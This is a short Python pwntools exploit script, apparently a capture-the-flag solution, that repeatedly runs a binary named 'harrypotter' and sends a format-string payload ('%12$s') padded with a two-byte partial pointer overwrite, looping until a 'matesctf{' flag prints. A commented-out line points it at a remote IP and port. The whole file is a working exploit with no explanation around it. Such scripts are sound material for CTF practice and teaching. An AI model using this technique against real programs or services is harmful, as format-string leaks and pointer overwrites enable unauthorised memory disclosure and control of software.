from pwn import *

i = 0
while True:
	r = process("./harrypotter")
	#r = remote("125.235.240.168",27017)
	context.log_level = "critical"
	print i
	i += 1
	payload = '%12$s'
	payload = payload.ljust(0x30,'B')
	payload += "\x60\xdc"
	r.recvuntil("It's time to cast your spell\n")
	r.send(payload)
	try:
		msg = r.recv()
		#print msg
		if "matesctf{" in msg and "matesctf{}" not in msg:
			print msg
			break
		r.close()
	except:
		r.close()	
